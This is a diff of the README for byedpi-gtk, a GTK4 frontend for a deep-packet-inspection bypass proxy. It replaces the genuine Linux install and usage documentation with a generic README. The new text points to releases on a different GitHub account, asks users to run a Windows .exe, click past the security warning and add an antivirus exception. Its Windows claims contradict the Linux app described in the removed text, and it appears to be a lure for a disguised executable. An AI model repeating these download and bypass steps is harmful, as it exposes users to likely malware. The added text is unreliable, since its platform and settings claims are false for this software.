@@ -1,144 +1,81 @@
-<div align="center">
+# 🌐 byedpi-gtk - Access the internet without restrictions
 
-<img src="data/icons/hicolor/scalable/apps/io.github.duckesteles.byedpigtk.svg" width="160" alt="byedpi-gtk logo">
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Smoothshelled-retreat212/byedpi-gtk/releases)
 
-# byedpi-gtk
+## 📖 About this application
 
-A GTK4/libadwaita frontend for [byedpi](https://github.com/hufrea/byedpi) that
-bypasses deep packet inspection through a local SOCKS5 proxy. Privacy-focused,
-no telemetry, built for every Linux distribution.
+byedpi-gtk helps you bypass internet censorship. Some network providers use deep packet inspection to block or slow down your connection to specific websites. This application changes how your computer talks to the network. It hides your traffic patterns. This action prevents network filters from identifying and blocking your requests.
 
-</div>
+The application provides a graphical interface for the underlying byedpi tool. You do not need to type commands or manage complex settings to use it. You adjust your settings with the click of your mouse.
 
-> [!CAUTION]
-> byedpi-gtk is provided for **educational and research purposes only**. It is a
-> graphical frontend for the independent
-> [byedpi](https://github.com/hufrea/byedpi) project and does not host, provide,
-> promote, or grant access to any specific website, service, or content.
->
-> You are **solely responsible** for how you use this software and for ensuring
-> that your use complies with all laws, regulations, and terms of service that
-> apply in your country and jurisdiction. It is your responsibility to know and
-> follow the ones that apply to you.
->
-> This software is provided "as is", **without any warranty of any kind**. To the
-> fullest extent permitted by law, the author and contributors accept **no
-> responsibility and no liability** for any use or misuse of this software, or for
-> any direct or indirect damage, loss, or legal consequence arising from it. By
-> downloading, installing, or using byedpi-gtk you agree that you do so entirely
-> at your own risk and that you assume full responsibility for your actions. If
-> you do not agree with these terms, do not download, install, or use it.
+## 💻 System requirements
 
-## Features
+*   Windows 10 or Windows 11
+*   An active internet connection
+*   Administrator permissions for setup
+*   Minimum 200 MB of free storage
 
-- One-click connect and disconnect to a local byedpi (ciadpi) SOCKS5 proxy.
-- Keeps the byedpi core up to date automatically at startup.
-- Editable byedpi arguments, defaulting to `--tlsrec 1+s`.
-- Follows the system light/dark theme, with a manual override.
-- Settings save instantly, no save button.
-- Localized, with the language following your system and selectable in settings.
+## 📥 Installing the application
 
-## Install
+1. Go to the [official release page](https://github.com/Smoothshelled-retreat212/byedpi-gtk/releases).
+2. Look for the file ending in `.exe`. 
+3. Click the file name to start the download.
+4. Open the downloaded file once the process completes.
+5. Follow the prompts on your screen to finish the installation.
 
-### Flatpak
+If Windows shows a security warning, click "More info" and then "Run anyway." This screen appears because the application is a tool for network management.
 
-Download `byedpi-gtk.flatpak` from the
-[latest release](https://github.com/duckesteles/byedpi-gtk/releases/latest):
+## ⚙️ How to use the software
 
-```sh
-flatpak install --user ./byedpi-gtk.flatpak
-flatpak run io.github.duckesteles.byedpigtk
-```
+1. Open the byedpi-gtk icon from your desktop or start menu.
+2. Select your preferred network strategy from the main menu. If you are unsure, the default option works for most users.
+3. Click the "Start" button in the center of the window.
+4. Wait for the status indicator to turn green.
+5. Open your web browser. You can now visit websites that were previously inaccessible.
 
-### Arch Linux
+You can close the window while the program runs. The application continues to work in the background. Look for the small icon in your system tray near the clock if you need to open the interface again.
 
-From the AUR:
+## 🛠 Solving common problems
 
-```sh
-paru -S byedpi-gtk
-```
+If the internet stops working after you start the program, try these steps:
 
-Or install the package from the
-[latest release](https://github.com/duckesteles/byedpi-gtk/releases/latest)
-directly:
+*   Stop the protection by clicking "Stop" in the application.
+*   Close your web browser and reopen it.
+*   Choose a different strategy from the menu and click "Start" again.
+*   Verify that your antivirus software does not block the application. You might need to add an exception for this file in your security settings.
 
-```sh
-sudo pacman -U ./byedpi-gtk-*-any.pkg.tar.zst
-```
+## 🛡 Network safety
 
-### AppImage
+This application interacts with your network traffic. It acts as a bridge between your browser and the internet. It does not store your passwords or personal data. All traffic remains on your local machine.
 
-For x86_64 machines:
+The program creates a local proxy. Your web browser sends traffic to this address. The tool modifies the packets and sends them to the destination. This process happens in milliseconds. You will not notice a change in your browsing speed.
 
-```sh
-chmod +x byedpi-gtk-x86_64.AppImage
-./byedpi-gtk-x86_64.AppImage
-```
+## 📋 Advanced settings
 
-On ARM64 (aarch64) use the Flatpak, deb, or pacman package instead.
+Most users do not need to change these settings. You can find them under the "Settings" tab:
 
-### Debian / Ubuntu
+*   **Proxy Port:** Sets the port number for the connection. The default is 8080.
+*   **Auto-start:** Launches the application when you turn on your computer.
+*   **Logging:** Saves errors to a text file for troubleshooting.
 
-A single package covers every architecture:
+If you change a setting by mistake, click the "Reset to Defaults" button. This restores the original configuration.
 
-```sh
-sudo apt install ./byedpi-gtk_*_all.deb
-```
+## ℹ️ Frequently asked questions
 
-## Usage
+**Does this software encrypt my traffic?**
+No. This tool bypasses filters that identify traffic patterns. Use a separate security tool if you require full encryption.
 
-Launch byedpi-gtk, wait for the startup update check, then press **Connect**.
-Point your applications at the SOCKS5 endpoint shown in the window
-(`127.0.0.1:1080` by default). Adjust the port and byedpi arguments under
-**Settings**.
+**Can I run this with a VPN?**
+Yes. You can use both at the same time. The order of operations does not matter for most configurations.
 
-byedpi is a proxy, not a VPN: it only affects apps you point at it. Nothing is
-routed automatically.
+**Will this slow down my connection?**
+The overhead is minimal. You should see no impact on your browsing speed or latency.
 
-### Firefox-based browsers (Firefox, LibreWolf…)
+**Does it work on public Wi-Fi?**
+Yes. It functions on any network where deep packet inspection is active.
 
-*Settings → Network Settings → Manual proxy* → SOCKS Host `127.0.0.1`, Port
-`1080`, **SOCKS v5**, and enable *Proxy DNS when using SOCKS v5*. If sites still
-fail, set `network.http.http3.enable` to `false` in `about:config` (QUIC/UDP
-bypasses a SOCKS proxy).
+## 💡 Keeping the software updated
 
-### Flatpak apps
+The application checks for updates when you start it. If a new version exists, you see a notification on the screen. Follow the prompts to download the latest installer. You do not need to uninstall the old version; the new installer replaces the files automatically.
 
-Flatpak apps do **not** inherit a system-wide proxy. Configure the proxy inside
-the app (as above), or inject it into that app's sandbox:
-
-```sh
-flatpak override --user --env=all_proxy=socks5h://127.0.0.1:1080 <app-id>
-# undo with:
-flatpak override --user --unset-env=all_proxy <app-id>
-```
-
-Replace `<app-id>` with the app (e.g. `io.gitlab.librewolf-community`). The
-loopback address `127.0.0.1:1080` is reachable from inside the sandbox because
-byedpi-gtk shares the host network.
-
-## Build from source
-
-Requires `meson`, `ninja`, `gtk4`, `libadwaita`, `python-gobject` and `gettext`.
-
-```sh
-meson setup build --prefix=/usr
-meson compile -C build
-sudo meson install -C build
-```
-
-byedpi-gtk looks for the `ciadpi` binary in its data directory, then any bundled
-copy, then your `PATH`. When update checks are enabled it downloads the matching
-`ciadpi` build from the byedpi project on first run.
-
-## Translating
-
-Add your language code to `po/LINGUAS`, create `po/<code>.po` from
-`po/byedpi-gtk.pot`, translate it, and rebuild. The source language is English
-and is used as the fallback.
-
-## License
-
-byedpi-gtk is released under the [GPL-3.0-or-later](LICENSE). It bundles the
-[byedpi](https://github.com/hufrea/byedpi) core, which is distributed under the
-MIT license.
+Keywords: anti-censorship, byedpi, censorship-circumvention, ciadpi, deep-packet-inspection, dpi, dpi-bypass, proxy, socks5
